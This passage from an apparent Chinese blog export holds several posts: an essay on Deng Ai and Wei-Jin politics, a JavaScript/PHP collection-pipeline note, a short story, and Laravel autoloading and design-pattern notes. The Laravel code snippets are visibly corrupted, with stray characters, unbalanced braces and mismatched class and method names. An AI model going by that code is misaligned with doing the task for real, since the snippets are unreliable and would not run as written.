<p>例如，曹魏在伐蜀战役中，根据钟会的谋划，魏军最初的战略意图是发动一个钳形攻势：钟会统帅伐蜀部队的主力十余万，从骆谷、斜谷的大路进取汉中；邓艾与诸葛绪各统军三万人从陇西进攻，进行战略牵制。邓艾进取甘松、沓中阻挠姜维的行动，诸葛绪进占武街、桥头切断姜维的退路，前后夹击，阻止姜维退向汉中，以使钟会率领魏军主力能够迅速占领汉中，打开进攻成都的通道。但由于诸葛绪在行动上的犹豫，差了一日的行程而未能阻截到姜维，姜维得以成功地从桥头突破，引军退往剑阁，依仗天险，与钟会率领的魏军主力相持。按照原计划的安排，邓艾本来应该和诸葛绪一样，引军东向，与钟会率领的主力会师，因为在伐蜀战役中，虽然名义上是“诏诸君伐蜀，皆指授节度”，但实际上钟会是这场战役的真正领导者。但由于姜维已抢先一步退往剑阁，据险防守，魏军原来的战略意图已无实现的可能，邓艾向东与钟会会师，并无实际意义。</p>
<p>因此邓艾决定改走阴平小路，穿越七百里的无人山地，绕过姜维所驻守的剑阁，直取成都。邓艾果敢的军事行动使他统帅的这支偏师立下灭蜀的首功。但是由于邓艾此举的确违背了事先的计划，尽管他在行动前曾上言司马昭，但却并没有知会钟会，钟会作为这次伐蜀战役的策划者与领导者，最终却无功而返，这对于一向骄傲自满的钟会而言无疑是个不小的挫折，钟会是一个权力欲和报复心强的人。并且由于邓艾在灭蜀之后专擅独行，“辄依邓禹故事，承制拜刘禅行骠骑将军，太子奉车、诸王驸马都督。蜀群司各随高下拜为王官，或领艾官署。以师纂领益州刺史，陇西太守牵弘等领蜀中诸郡”，在处理善后事宜时，丝毫没有征询钟会等人的意见，使得邓艾钟会的关系迅速破裂，于是钟会、卫瓘向司马昭献言，致使邓艾及其子被杀，其子弟皆流放边境。然而钟会谋反之罪，只株连了直系子弟，颍川钟氏地位受影响则有限，而邓艾仅仅以专擅之罪，不仅祸及家族，就连后来为其平反都困难重重。</p>
<p>《三国志.邓艾传》中写道：</p>
<blockquote>
<p>泰始元年，晋室践祚，诏曰：“昔太尉王淩谋废齐王，而王竟不足以守卫。征西将军邓艾，矜功失节，实应大辟。然被书之日，罢遣人众，束手受罪，比于求生遂未恶者，诚复不同。今大赦得还，若无子孙者听使立后，令祭祀不绝。</p>
</blockquote>
<p>赦免在魏末反对司马氏诸人的后裔，是西晋立国之后争取人心的一项举措。准许给邓艾立后，便是其中的一部分，但在诏书中依然强调“矜功失节，实应大辟”。在邓艾“悖逆”的罪名无法成立的情况下，依然认为邓艾之死是罪有应得，更为奇怪的是诏书将邓艾与王淩归为一类加以处置。王淩是试图推翻司马懿执政地位的人物，对于司马氏政权来说，其罪孽无疑要比邓艾深重得多，但根据诏书的解释，王淩当年谋废齐王芳之举，因为后来齐王芳本人被司马师所废，竟然变成了一次政治正确的举动，显然这是司马氏为了减轻王淩的罪责而特意发明的借口。司马氏为什么急于给反对过自己的王淩平反，而对为司马氏立下大功的邓艾却如此吝啬？其根本原因恐怕在于，王淩本人与司马氏家族及西晋官僚集团有着很深的渊源，其子王广亦是名士，王淩、王广虽被杀，但是他们的故旧殷勤依然是司马氏需要倚重的力量。这也可以解释为何晋武帝不惜屈尊降节，亲自前往琅琊王妃处见诸葛诞之子诸葛靓，与之修好。嫁给琅琊王司马伷的诸葛靓之姊，为其子司马觐取字为思祖，其所思者正为其外祖诸葛诞，这几乎是公开向司马氏叫板，而武帝依然不以为忤。因为诸葛诞同样也是魏末人士的领袖，琅琊诸葛氏更是一个在汉晋之际具有广泛影响力的名门望族。同样是涉及淮南叛乱，司马氏却从来没有想到为毋丘俭平反，在此厚此薄彼的背后有着非常微妙的政治考量。</p>
<p>而后来的石苞、王濬、张华等人皆出身寒微，其政治遭遇也与邓艾类似。</p>
<p>由此可见，魏晋虽然经历了由曹氏入司马氏的转变，但实际上由于司马氏并没有进行大规模政治清洗的条件，所以必须不断同世家大族进行妥协，并且，由于晋朝沿用了曹魏的制度，使得朝中政治门阀盘根错节，世家大族在文化、政治层面上均实现了认同，对于寒门士子多加排斥，抹杀了寒门士子的晋升之路，因此西晋刚刚建国，却显得垂垂老矣。虽然晋武帝司马炎在平吴后建立事功，声望大涨，并引入外戚弘农杨氏来抗衡宗室与功臣。但其坚决要将齐王司马攸外徙，使得宗室中两位最具才望的藩王司马攸、司马骏忿恨而死，重臣羊琇、向雄忧愤而卒；郑默、曹志等九人被免官。使得本来就盘根错节的政治局势更加动荡不安。由于晋武帝引入、培育外戚，使得其死后杨骏矫诏夺权，虽然其在夺权之后，对于功臣多加优渥对待，但由于世家大族均对杨氏心存不满，这些举措也并未收买到人心。朝中上下的不满情绪被皇后贾妃利用，使得贾后得以发动政变，尽诛杨氏一族。同时又由于贾后擅杀太子司马燏，使得宗室震怒，赵王司马伦由此入京，几百年动乱的大乱局由此肇始。</p>
]]></content>
      <categories>
        <category>历史</category>
      </categories>
      <tags>
        <tag>魏晋</tag>
      </tags>
  </entry>
  <entry>
    <title>使用管道代替循环</title>
    <url>/2020/07/07/1/</url>
    <content><![CDATA[<p>在《重构》这本书里提到了一个改善程序的方法，“以管道取代循环（Replace Loop with Pipeline）”。</p>
<a id="more"></a>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> names=[];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">const</span> i <span class="keyword">of</span> input)&#123;</span><br><span class="line">	<span class="keyword">if</span>(i.job===<span class="string">"programmer"</span>)</span><br><span class="line">		names.push(i.name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> names=input.filter(<span class="function"><span class="params">i</span> =&gt;</span> i.job===<span class="string">"programmer"</span>).map(<span class="function"><span class="params">i</span>=&gt;</span>i.name);</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> nums=[<span class="number">10</span>,<span class="number">20</span>,<span class="number">111</span>,<span class="number">222</span>,<span class="number">444</span>,<span class="number">40</span>,<span class="number">50</span>];</span><br><span class="line"><span class="keyword">let</span> total=nums.filter(<span class="function"><span class="params">n</span>=&gt;</span>n&lt;<span class="number">100</span>).map(<span class="function"><span class="params">n</span>=&gt;</span>n*<span class="number">2</span>).reduce(<span class="function">(<span class="params">pre,n</span>)=&gt;</span>pre+n);</span><br><span class="line"><span class="built_in">console</span>.log(total);</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="number">240</span></span><br></pre></td></tr></table></figure>
<p>集合管道（collection pipeline）允许使用一组运算来描述集合的迭代过程，其中每种运算接受的入参和返回值都是一个集合。这类运算有很多，map是指用一个函数作用于输入集合的每一个元素，将集合变换成另一个集合；filter运算时指用用一个函数从输入集合筛选出符合条件元素子集的过程。运算得到的集合可以供管道的后续流程使用；而reduce运算是通过输入做一个数组，最后经过进行汇总运算最后输出一个值。</p>
<p>在许多不同的语言中也有函数式编程的方法。</p>
<p>例如在php中：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $nums=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">count</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $nums=<span class="keyword">$this</span>-&gt;nums;</span><br><span class="line">        $result=array_reduce(array_map(<span class="function"><span class="keyword">function</span> <span class="params">($num)</span></span>&#123;</span><br><span class="line">            <span class="keyword">return</span> $num*$num;</span><br><span class="line">        &#125;,array_filter($nums,<span class="function"><span class="keyword">function</span> <span class="params">($num)</span></span>&#123;</span><br><span class="line">            <span class="keyword">return</span> $num &gt;= <span class="number">5</span>;</span><br><span class="line">        &#125;)),<span class="function"><span class="keyword">function</span> <span class="params">($preValue,$num)</span></span>&#123;</span><br><span class="line">            <span class="keyword">return</span> $preValue+$num;</span><br><span class="line">        &#125;,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">echo</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $test=<span class="keyword">new</span> Test();</span><br><span class="line">    $test-&gt;count();</span><br><span class="line">&#125;</span><br><span class="line">main();</span><br><span class="line">-----------------------------------------------------------------------------------------</span><br><span class="line"><span class="number">110</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>函数式编程</tag>
        <tag>重构</tag>
      </tags>
  </entry>
  <entry>
    <title>颂歌</title>
    <url>/2020/07/06/1/</url>
    <content><![CDATA[<p>多年以后，当他躺在一张逼仄的床上，岁月的痕迹无情地刻在他的脸上，浑浊的老眼已经迷瞪地无法睁开的时候，他依然清楚地记得，在他三十三岁那年，他从一场噩梦中惊醒，回忆起很久以前的往事。</p>
<a id="more"></a>
<p>那时他睡的床还很大、很舒服，他的生活很考究，他的床单、被罩、床垫、枕巾无一不是最好、最贵的。他的客厅里焚着名贵的香料，这大概已经是古人所用的东西，但他却偏偏喜欢。在每晚睡前，他都会点上香料，他认为香料可以帮他入眠，他是一个严重的失眠者，尽管他每天都看起来精神饱满，面带着笑容。</p>
<p>但不可避免，淡淡的幽香总会使他联想到一切受阻的事情，但这种事情好像永远也无法同他联系起来。再过几天，一件也许是他命运中最重要的事情将会发生，他将成为公司里最为年轻的合伙人。这个每个具有理想的年轻人梦寐以求的事情，，在他这里仿佛是唾手可得。但他却并不十分高兴，在满屋氤氲的香气中，他甚至闻到了苦杏仁的味道。</p>
<p>那大概是很久很久以前的事情了，他大概已经把她的模样忘却了，但总有一根像是浸了水的绸带绑在他的心上，他愈是挣扎，这绸带便缚的愈紧，就同他的失眠一般，越是努力地想要入眠，却又偏偏更加心烦迷乱。</p>
<p>“你应当知道，这件事情已经永远无法更改了”，他的朋友笑了笑，把身体向后靠了靠“像我们这样年龄的人应该很清楚，爱情不过是青春的把戏，它只能够使得人们获得一时的欢愉，但却永远无法真正的幸福，在爱情的蜜月期过后，留下的无非是油盐酱醋与满地鸡毛，人类同动物没什么区别，就像猴子一样，它站在悬崖的一边，巴望着悬崖另一边的桃子，当它得到了那个桃子，却又去巴望着更远处的另一个桃子了。即使是最幸福的婚姻，一生中也会有200次离婚的念头和50次掐死对方的想法。”</p>
<p>他叹了口气，“在我生命中的抉择中，我每一次都选择了理性。但假若有再来一次的机会的话，我宁愿换一种活法。”</p>
<p>他的朋友突然眯起眼睛，露出了神秘的笑容，“不，你依然会如此选择。”</p>
<p>在他年轻的时候，他喜欢别人的颂歌。尤其是当他考了年级第一的时候，看到别人对他敬佩且歆羡的眼神，听到别人对他的赞美与谀词，他都会真正地感到高兴。他是一个有雄心壮志的人，在与同龄的小孩子还在外面疯玩的时候，他已经在家里静静地阅读同他的年龄超前许多的东西。他是一个极具理性的人，当每次发生自己喜欢的任何东西与自己的理想相冲突的时候，他总会毫不犹豫地去选择自己的理想，但除了那个女孩。</p>
<p>他仍然记得，在很长的一段时期里，天真的未经爱情驯化的少年开始了他孤独狩猎者的生涯。从早七点起，他就独自一人坐在花园里一条不易被发现的长椅上，在杏树的树荫下假装读一本诗集，直到看见那位美丽的姑娘的经过。她身着淡蓝色的短裙，带吊袜带的长袜一直拉到膝头，一头青丝似的长发从后背垂直腰间，她昂首挺胸，目不斜视，步履轻快，鼻翼微收，她就像一头小鹿一样，走起路来有一种天生的骄傲。慢慢地，他将她理想化了，把一切不可能的美德和想象中的情感全都归属于她。他特意去买了精美的信纸与信封，在信纸上满满当当写了几千字的情书，这全部都源于他因阅读而积累的词句。</p>
<p>他除了她什么都不想了，他想将这封信偷偷地去交给她，却又偏偏患得患失，他整夜整夜地失眠，努力地使自己不去想这件事情，可这件事情却又偏偏不断地冒出心头。终于，他狠下心肠，理性又占了上风，他努力地去将她身上的光环一点点褪去，将她的美好品德忘却，幻想出她的不堪，以此来增加自己对她的厌恶之情，藉此来忘掉这件事情，他期待这种情愫就像石沉大海一样，无法再去波动他的情绪。是的，的确如此，他强大的理性使得他又可以一心一意地去追逐理想了，但在此之后他不再那么喜欢别人的颂歌了，他也逐渐变得不那么十分的高兴，他人的颂歌在他听来仿佛有了些讽刺的意味。</p>
<p>他仍然记得在高考后出分的那个晚上，他的父母从所未有的高兴，他们家的亲戚朋友轮番地来赞扬他，但他却只觉得吵闹。</p>
<p>在很长一段时间里，他都会早早地躺在床上，将手边的书放在壁橱上，将手边的灯关上，随即合上了眼皮，他在心里不断地咕哝着，“我就要睡着了”，可这种心理暗示不但毫无效果，反而使他更加的清醒了，他开始对夜晚一切微小的声音十分的敏感，钟表的震动声，窗外的车鸣声，夜鸟的振翅声。天地无此静穆，但也无此吵闹。他的脑子里又开始回放起一首首已经记不得名字的歌曲，虽然记不得名字，但旋律却格外清晰，他清楚地明白自己曾经一定非常地喜欢它们，但却偏偏记不得了。他头痛欲裂，坐起身来，拨开不透一丝光亮的窗帘，望向窗外，外面灯光微茫，偶尔有夜行的汽车驶过。他无法入眠，在昏暗的客厅里缓缓踱步，过一会儿便又坐在客厅的沙发上，紧紧盯着钟表秒针的震动。</p>
<p>后来，他又习惯了晚睡，这倒是可以使他快速入眠，不过，这倒又使得他做上了梦。在梦里，他又回到了儿时的那个应有尽有的花园去玩耍，在魔毯的承载下上天入地，他总是回忆起从前的事情，在天蒙蒙亮，乍醒过来的时候，他甚至忘记了自己是谁，他的身体姿势同平时的睡态大相径庭，仿佛他一抬手间，就可以让太阳停止运行，甚至后退，他觉得自己又是个拥有超能力的小孩子了，但刹那间的恍惚过后，他又知道自己不是。</p>
<p>今天就是他生命中极为重要的一天了，他将要成为这所上市公司的合伙人。他望向窗外，外面淅淅沥沥地滴着几滴雨点，在一场暴风雨过后，行人们又开始逐渐多了起来，他忽然心中一动，“她这时候在做什么呢？”，面对着无数的歌颂与赞美，他勉强挤出了一丝笑容，同他们握手、致谢，但他心中却厌烦无比，他不断地望向窗外，他看见了，雨停了，太阳出来了，云彩变白了。但他，想去云的彼端。</p>
<p>现在，他闭上浑浊的双眼，心里扫过往事，他至今已经明白他朋友的那个神秘的笑容是什么意味，但他仍然想，如果他死后可以不喝孟婆汤的话，他一定要换个活法。</p>
<p>（全文完）</p>
]]></content>
      <categories>
        <category>小说</category>
      </categories>
      <tags>
        <tag>爱情</tag>
        <tag>人生</tag>
      </tags>
  </entry>
  <entry>
    <title>深入理解Laravel</title>
    <url>/2020/06/28/1/</url>
    <content><![CDATA[<p><img src="/2020/06/28/1/deep-understanding-of-laravel%5Claravel.png" alt></p>
<a id="more"></a>
<h2 id="组件化开发与composer"><a class="markdownIt-Anchor" href="#组件化开发与composer"></a> 组件化开发与composer</h2>
<h3 id="composer"><a class="markdownIt-Anchor" href="#composer"></a> composer</h3>
<h4 id="组件安装"><a class="markdownIt-Anchor" href="#组件安装"></a> 组件安装</h4>
<h4 id="自动加载"><a class="markdownIt-Anchor" href="#自动加载"></a> 自动加载</h4>
<p>PSR-0和PSR-4标准</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">"autoload"</span>:&#123;</span><br><span class="line">		<span class="attr">"psr-4"</span>:&#123;<span class="attr">"APP\\"</span>:<span class="string">"app/"</span></span><br><span class="line">				 <span class="string">"BPP\\"</span>:<span class="string">"bpp/"</span></span><br><span class="line">			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="文件包含"><a class="markdownIt-Anchor" href="#文件包含"></a> 文件包含</h4>
<p><strong>include和require关键字</strong></p>
<p>include和require关键字用于包含并运行指定文件。两者作用几乎一样，只是处理失败的方式不同，require在出错时会导致脚本程序运行终止，而include只是发出警告，而脚本程序会继续运行。</p>
<h4 id="类的自动加载"><a class="markdownIt-Anchor" href="#类的自动加载"></a> 类的自动加载</h4>
<p>类的自动加载可以通过魔术方法__autoload(string $class)实现，也可以通过函数spl_autoload_register注册一个自动加载方法，相应实例如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span><span class="params">($class)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">require_once</span>($class.<span class="string">".php"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当使用一个类名时，如果该类没有被当前文件包含，则会自动调用————autoload魔术方法。但在实际应用中，通常使用spl_autoload_register注册自动以德函数作为自动加载类的实现，因为__autoload()魔法函数只可以定义一次，而spl_autoload_register可以将多个类自动加载方法注册到队列。</p>
<p>在Laravel框架中，通过函数spl_autoload_register()实现类自动加载函数的注册，其中 类的自动加载函数队列中包含了两个类的自动加载函数，一个是composer生成的基于PSR 规范的自动加载函数，另一个是Laravel框架核心别名的自动加载函数。下面将给出Laravel 框架中的部分代码，进而介绍该框架下类的自动加载过程。这里Laravel框架所在根目录为 “laravel”，其中composer生成的自动加载函数注册过程如下：</p>
<p>文件：laravel\public\index.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    require __DIR__.*&#x2F;..&#x2F;bootstrap&#x2F;autoload.php;</span><br><span class="line">	laravel\bootstrap\autoload.php</span><br></pre></td></tr></table></figure>
<p>文件： laravel\bootstrap\autoload.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">define (<span class="string">' LARAVEL_START'</span>, microtime (<span class="keyword">true</span>));</span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/・・/vendor/autoload.php1;</span></span><br></pre></td></tr></table></figure>
<p>在Laravel框架中，public\index.php文件为请求的入口文件，其中第一句便是包含启 动文件夹下的自动加载的文件，而该文件继续包含vendor目录下的自动加载文件，其中 vendor目录是composer生成的依赖包目录，而内部的自动加载文件也是composer生成的， 用于自动加载依赖包中的所有文件。下面简单介绍composer生成的类自动加载函数是如何 实现的。</p>
<p>文件：laravel\vendor\autoload.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">require_once __DIR__ . &#39;&#x2F;composer&#39; . &#39;&#x2F;autoload_real.php&#39;;</span><br><span class="line">return ComposerAutoloaderInit99123d508294c719fdcf537b9ee84731 ::getLoader();</span><br></pre></td></tr></table></figure>
<p>文件:laralvel\vendor\composer\ autoload_real.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ComposerAutoloaderInit99123d508294c719fdcf537b9ee84731</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> $loader;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">loadClassLoader</span><span class="params">($class)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (*Composer\Autoload\ClassLoader === $class) </span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">require</span> <span class="keyword">__DIR__</span> .<span class="string">'/ClassLoader.php'</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getLoader</span><span class="params">()</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">null</span> !== <span class="keyword">self</span>::$loader) &#123;</span><br><span class="line">					<span class="keyword">return</span> <span class="keyword">self</span>::$loader;</span><br><span class="line">                &#125;</span><br><span class="line">				spl_autoload_register(<span class="keyword">array</span>(<span class="string">'ComposerAutoloaderInit99123d508294c719fdcf53</span></span><br><span class="line"><span class="string">7b9ee84731'</span>z <span class="string">'loadClassLoaderr), true, true);</span></span><br><span class="line"><span class="string">		self::$loader = $loader = new \Composer\Autoload\ClassLoader();</span></span><br><span class="line"><span class="string">		spl_autoload_unregister(array('</span>ComposerAutoloaderInit99123d508294c719fdef</span><br><span class="line"><span class="number">537</span>b9ee84731<span class="string">', '</span>loadClassLoader1));</span><br><span class="line">			$map = <span class="keyword">require</span> <span class="keyword">__DIR__</span> . */autoload_namespaces.phpr;</span><br><span class="line">		<span class="keyword">foreach</span> ($map <span class="keyword">as</span> $namespace =&gt; $path) &#123;</span><br><span class="line">				$loader-&gt;set($namespacer $path);</span><br><span class="line">			&#125;</span><br><span class="line">			$map = <span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/autoload_psr4.php'</span>;</span><br><span class="line">		<span class="keyword">foreach</span> ($map <span class="keyword">as</span> $namespace =&gt; $path) &#123;</span><br><span class="line">				$loader-&gt;setPsr4($namespacer $path);</span><br><span class="line">			&#125;</span><br><span class="line">		$classMap = <span class="keyword">require</span> <span class="keyword">__DIR__</span> ・•/autoload_classmap.php1;</span><br><span class="line">		<span class="keyword">if</span> ($classMap) &#123;</span><br><span class="line">				$loader-&gt;addClassMap($classMap);</span><br><span class="line">			&#125;</span><br><span class="line">		$loader-&gt;register(<span class="keyword">true</span>) ;	<span class="comment">//注册类自动加载函数</span></span><br><span class="line">		$includeFiles = <span class="keyword">require</span> <span class="keyword">__DIR__</span> .<span class="string">'/autoload_files.php'</span>;</span><br><span class="line">		<span class="keyword">foreach</span> ($includeFiles <span class="keyword">as</span> $file) &#123;</span><br><span class="line">				composerRequire99123d508294c719fdcf537b9ee84731($file);</span><br><span class="line">				&#125;</span><br><span class="line">		<span class="keyword">return</span> $loader;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">composerRequire99123d508294c719fdcf537b9ee84731</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">		<span class="keyword">require</span> $file;</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>（后面太多了不想拷贝了）</p>
<h2 id="laravel框架中的设计模式"><a class="markdownIt-Anchor" href="#laravel框架中的设计模式"></a> Laravel框架中的设计模式</h2>
<h3 id="服务容器"><a class="markdownIt-Anchor" href="#服务容器"></a> 服务容器</h3>
<h4 id="依赖和耦合"><a class="markdownIt-Anchor" href="#依赖和耦合"></a> 依赖和耦合</h4>
<h4 id="工厂模式"><a class="markdownIt-Anchor" href="#工厂模式"></a> 工厂模式</h4>
<h4 id="ioc模式"><a class="markdownIt-Anchor" href="#ioc模式"></a> IOC模式</h4>
<p>IoC (Inversion of Control)模式又称依赖注入 (Depe-ndency Injection )模式。控制反转是将组件间的依赖关系从程序内部提到外部容器 来管理，而依赖注入是指组件的依赖通过外部以参数或其他形式注入，两种说法其实本质上 是一个意思。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Traverller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $trafficTool;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(Visit $trafficTool)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;trafficTool=$trafficTool;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vistTibet</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;trafficTool-&gt;go();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//生成以来的交通工具实例</span></span><br><span class="line"></span><br><span class="line">$trafficTool = <span class="keyword">new</span> Leg();</span><br><span class="line"><span class="comment">//依赖注入的方式解决依赖问题</span></span><br><span class="line"></span><br><span class="line">$tra=<span class="keyword">new</span> Traveller($trafficTool);</span><br><span class="line">$tra-&gt;visitTibet();</span><br></pre></td></tr></table></figure>
<h3 id="请求处理管道"><a class="markdownIt-Anchor" href="#请求处理管道"></a> 请求处理管道</h3>
<p>上面已经解决了 Laravel框架中一个关键技术，就是利用服务容器和服务提供者解决依 赖注入及资源获取的功能，有了它就可以随时获取需要的服务，实现想要的功能。但对于服 务器来说，真正要实现的功能是处理输入的请求，并将生成的响应输出给客户端，而在处 理请求的过程中需要经历很多处理步骤，这些步骤需要做到松耦合，可以随时在这些步骤 中间添加新的处理功能而使改动尽可能小，通过源码的注解，设计者将其比喻成“洋葱”， 像它一样分很多层，每一层具有一定的功能，可以随时添加或修改这些层，而官方文档中将 这些层称为中间件，通过这些中间件使得程序的可扩展性大大增强。这里，其实使用的是一 种装饰者模式，只是PHP特有的编程方式使得其形式发生变化，下面我们就逐步揭开它的 面纱。</p>
<h4 id="装饰者模式"><a class="markdownIt-Anchor" href="#装饰者模式"></a> 装饰者模式</h4>
<p>装饰者模式是在开放一关闭原则下实现动态添加或减少功能的一种方式。以Laravel框 架为例，在解析请求生成响应之前或之后需要经过中间件的处理，主要包括验证维护模式、 Cookie加密、开启会话、CSRF保护等，而这些处理有些是在生成响应之前，有些是在生成 响应之后，在实际开发过程中有可能还需要添加新的处理功能，如果在不修改原有类的基础 上动态地添加或减少处理功能将使框架可扩展性大大增强，而这种需求正好可以被装饰者模 式解决。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Decorator</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XiaoFang</span> <span class="keyword">implements</span> <span class="title">Decorator</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $name;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"我是"</span>. <span class="keyword">$this</span>-&gt;name .<span class="string">"我出门了！ ！ ！ "</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Finery</span> <span class="keyword">implements</span> <span class="title">Decorator</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $component;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(Decorator $component)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;component = $component;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;component-&gt;display();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shoes</span> <span class="keyword">extends</span> <span class="title">Finery</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"穿上鞋子"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">parent</span>::display();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Skirt</span> <span class="keyword">extends</span> <span class="title">Finery</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> ”穿上裙子 n. r&lt;br&gt;*;</span><br><span class="line">		<span class="keyword">parent</span>::display();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fire</span> <span class="keyword">extends</span> <span class="title">Finery</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span><span class="string">'出门前先整理头发'</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">		<span class="keyword">parent</span>::display();</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'出门后再整理一下头发'</span> . <span 